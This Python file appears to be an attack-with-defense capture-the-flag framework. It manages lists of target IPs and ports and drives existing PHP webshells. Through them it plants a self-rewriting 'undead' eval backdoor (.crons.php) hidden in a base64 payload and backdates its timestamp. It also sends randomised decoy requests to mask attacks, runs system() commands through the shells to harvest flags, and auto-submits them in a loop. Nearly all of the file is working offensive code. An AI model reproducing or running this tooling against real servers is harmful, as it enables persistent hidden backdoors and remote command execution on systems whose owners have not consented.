#-*-coding:utf-8-*-
import sys,requests
import os
import random
import time
ipList = []
port_list = []
webshell_list = []
webshell = ""
strip = ""
pathList = []#流量混淆全局列表
temp = ""
send_liuliang = []#待攻击流量列表
flag_shell = ""
flag_shell_list = []#flagshell列表
flag = []#全局flag列表
flag_str = ""

def loadfile(filepath):
	try :
		file = open(filepath,"rb")
		return str(file.read())
	except :
		print ("File %s Not Found!" %filepath)
		sys.exit()
def get_port(port):
    global port_list
    if '-' in port:
        plist = port.split('-')
        m = int(plist[0])
        n = int(plist[1])
        for i in range(m, n + 1):
            i = str(i)
            port_list.append(i)
    else:
        port_list.append(port)
    return port_list
def ip_list(x):
    global ipList
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m,n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList),key = ipList.index)
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList),key = ipList.index)
    return ipList
def print_ip():
    global ipList
    if ipList == []:
        print("您还未添加ip")
    else:
        for i in ipList:
            print (i)
def clear_ip():
    global ipList
    ipList = []
def remove_ip(ip):
    global ipList
    try:
        ipList.remove(ip)
        return 1
    except:
        return 0
def add_shell(shell_path,shell_pass,get_post_path):
    global webshell
    http = "http://"
    for ip in ipList:
        for port in port_list:
            webshell = webshell+http+ip+":"+port+shell_path+","+shell_pass+","+get_post_path+"\n"
    print(webshell)
def add_flag_shell(shell_path,shell_pass,get_post_path):
    global flag_shell
    http = "http://"
    for ip in ipList:
        flag_shell = flag_shell+http+ip+shell_path+","+shell_pass+","+get_post_path+"\n"
    print(flag_shell)
def cmd(url,method,passwd):
    try:
        url.index("http")
        # 去除http://   ==> 127.0.0.1:80/1110/x.php
        urlstr = url[7:]
        lis = urlstr.split("/")
        ip = str(lis[0])
        Rfile = ""
        for i in range(1, len(lis)):
            Rfile = Rfile + "/" + str(lis[i])
    except:
        urlstr = url[8:]
        lis = urlstr.split("/")
        ip = str(lis[0])
        Rfile = ""
        for i in range(1, len(lis)):
            Rfile = Rfile + "/" + str(lis[i])
    try:
        res = requests.get(url, timeout=3)
        print("[+] %s SUCCESS" % url)
    except:
        print("[-] %s ERR_CONNECTION_TIMED_OUT" % url)
        return 0
    if res.status_code != 200:
        print("[-] %s Page Not Found!" % url)
        return 0
        # 执行命令 system,exec,passthru,`,shell_exec
        # a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
    data = {}
    if method == 'get':
        data[passwd] = '@eval(base64_decode($_GET[z0]));'
        data['z0'] = 'c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSIwZTY3YTgyYWIxOGQ1MTNkMzE2ZTUwZjVmNzljNmZlNiIpe0BldmFsKCRfUE9TVFsiY21kIl0pO30gPz5cJyA+LmNyb25zLnBocDt0b3VjaCAtbSAtZCAiMjAxNy0xMS0xNyAxMDoyMToyNiIgLmNyb25zLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
        try:
            res = requests.get(url, params=data, timeout=3)
        except:
            pass
    elif method == 'post':
        data['pass'] = "ymlsec"
        data[passwd] = '@eval(base64_decode($_POST[z0]));'
        data['z0'] = 'c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSIwZTY3YTgyYWIxOGQ1MTNkMzE2ZTUwZjVmNzljNmZlNiIpe0BldmFsKCRfUE9TVFsiY21kIl0pO30gPz5cJyA+LmNyb25zLnBocDt0b3VjaCAtbSAtZCAiMjAxNy0xMS0xNyAxMDoyMToyNiIgLmNyb25zLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
        try:
            res = requests.post(url, data=data, timeout=3)
        except:
            pass
def undead_shell():
    #shellstr = loadfile("data/webshell.txt")
    #for eachline in shellstr:
        #print(eachline)
    #list = shellstr.split("\r\n")
    #print (len(list))
    list = []
    with open("data\webshell.txt", 'r') as f:
        line = f.readline().strip()
        while line:
            list.append(line)
            line = f.readline().strip()
    print(list)

    i = 0
    url = {}
    passwd = {}
    method = {}
    for data in list:
        if data:
            ls = data.split(",")
            method_tmp = str(ls[2])
            method_tmp = method_tmp.lower()
            print(method_tmp)
            if method_tmp == 'post' or method_tmp == 'get':
                url[i] = str(ls[0])
                method[i] = method_tmp
                passwd[i] = str(ls[1])
                print(url[i])
                print(method[i])
                print(passwd[i])
                i += 1
            else:
                print ("[-] %s request method error!" % (str(ls[0])))
        else:
            pass

    for j in range(len(url)):
        cmd(url=url[j], method=method[j], passwd=passwd[j])
def save_shell():
    f = open('data/webshell.txt','w+')
    f.write(webshell)
    f.close()
def save_flag_shell():
    f = open('data/flagshell.txt', 'w+')
    f.write(flag_shell)
    f.close()
def save_ip():
    global strip
    for ip in ipList:
        for port in port_list:
            strip = strip+ip+":"+port+"\n"
    f = open('data/iplist.txt','w+')
    f.write(strip)
    f.close()
def load_ip():
    global ipList
    ipList = []
    with open('data/iplist.txt','r',encoding='gbk') as f:
        thelist = f.read()
        f.close()
    ipList = thelist.split('\n')
    ipList.remove('')
    return ipList
def load_webshell():
    global webshell_list
    with open('data/webshell.txt', 'r', encoding='gbk') as f:
        thelist = f.read()
        f.close()
    webshell_list = thelist.split('\n')
    webshell_list.remove('')
    print(webshell_list)
    return webshell_list
def load_flagshell():
    global flag_shell_list
    flag_shell_list = []
    with open('data/flagshell.txt','r',encoding='gbk') as f:
        thelist = f.read()
        f.close()
    flag_shell_list = thelist.split('\n')
    flag_shell_list.remove('')
    print(flag_shell_list)
    return flag_shell_list
def confusion_payload():#混淆payload函数
    random_char = "abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    random_strings = "".join(random.sample(random_char, random.randint(1, 106)))  # 此处最大值，根据字符串长度
    return random_strings
def attack_ll():
    path = 'E:\YML-AWD-FRAMEWORK\html'
    global pathList
    for root, dirs, files in os.walk(path):
        for name in files:
            tmp_path = root.replace(path, "")
            tmp_path = tmp_path.replace("\\", "/")
            tmp_path2 = tmp_path + "/" + name
            pathList.append(tmp_path2)
        for name in dirs:
            tmp_path = root.replace(path, "")
            tmp_path = tmp_path.replace("\\", "/")
            tmp_path2 = tmp_path + "/" + name
            pathList.append(tmp_path2)
    return pathList
def ll_hunxiao():
    global pathList
    global ipList
    global send_liuliang
    global temp
    for ip in ipList:
        for path in pathList:
            random_str = confusion_payload()
            temp = temp+"http://"+ip+path+"?shell="+random_str+"\n"
    send_liuliang = temp.split("\n")
    send_liuliang.remove("")
def send_ll():#发送混淆流量
    for url in send_liuliang:
        try:
            requests.get(url,timeout=1)
            print("[+] "+url+":success")
        except:
            print("[-] "+url+":fail")
def submit_flag(url,flag,type="get"):
    url_list = url.split(" ")
    for i in range(len(url_list)):
        if url_list[i] == "yml-flag":
            url_list[i] = flag
    #print(url_list)
    url = "".join(url_list)#列表转字符串
    #print(url)
    if type == 'post' or type == 'get':
        if type == 'post':
            try:
                pass
            except:
                pass
        if type == 'get':
            try:
                html = requests.get(url,timeout = 3)
                print("[+submit]"+html.text)
            except:
                print("[-submit]"+url)
    else:
        print("ERROR:请输入get或post")
def save_flag():
    global flag
    global flag_str
    flag = list(set(flag))
    try:
        flag.remove(0)
    except:
        pass
    print(flag)
    flag_str = ""
    for i in flag:
        flag_str = flag_str+i+"\n"
    f = open('data/flag.txt', 'w+')
    f.write(flag_str)
    f.close()
def socket_flag(url,method,passwd,get_flag_cmd):#post或get操作
    data = 'system("'+ get_flag_cmd+'");'
    if method == "post":
        try:
            html = requests.post(url,data = {passwd:data},timeout = 1)
            if html.status_code == 200:
                print ("[+post]"+url+"[+]flag:"+html.text)
                return html.text
            else:
                print("[-code:"+html.status_code+"]:"+url)
                return 0
        except:
            print("[-post]url:"+url)
            return 0
    if method == "get":
        try:
            url_get = url+"?"+passwd+"="+data
            html = requests.get(url_get,timeout=2)
            print("[+get]"+url+"[+]flag:"+html.text)
            return html.text
        except:
            print("[-get]url:" + url)
def get_flag(get_flag_cmd):
    list = []
    global flag
    print("DEMO:http://10.10.10.10/index.php?flag= yml-flag &name=666")
    submit_flag_url = input("请输入提交flag的链接(flag用yml-flag替换,两边加空格):")
    with open("data/flagshell.txt", 'r') as f:
        line = f.readline().strip()
        while line:
            list.append(line)
            line = f.readline().strip()
    i = 0
    url = {}
    passwd = {}
    method = {}
    for data in list:
        if data:
            ls = data.split(",")
            method_tmp = str(ls[2])
            method_tmp = method_tmp.lower()
            #print(method_tmp)
            if method_tmp == 'post' or method_tmp == 'get':
                url[i] = str(ls[0])
                method[i] = method_tmp
                passwd[i] = str(ls[1])
                #print(url[i])
                #print(method[i])
                #print(passwd[i])
                i += 1
            else:
                print("[-] %s request method error!" % (str(ls[0])))
        else:
            pass
    time_temp = 1
    while True:
        for j in range(len(url)):
                return_flag = socket_flag(url=url[j], method=method[j], passwd=passwd[j], get_flag_cmd=get_flag_cmd)
                flag.append(return_flag)
        save_flag()
        print("3秒后尝试提交flag:")
        for i in range(1, 4):
            s = '>' * i + '[' + str(i) + 's' + ']'  # 这个方法同第二种类似
            print('%s' % s, end='\r')  # 每行以'\r'结尾，就可以输出在同一行
            time.sleep(1)
        for submit_flag_str in flag:
            submit_flag(url=submit_flag_url, flag=submit_flag_str)
        print("60秒进行下一轮操作:")
        for i in range(1, 61):
            s = '>' * i + '[' + str(i) + 's' + ']'  # 这个方法同第二种类似
            print('%s' % s, end='\r')
            time.sleep(1)
        flag = []
        time_temp = time_temp + 1
        print(time_temp)


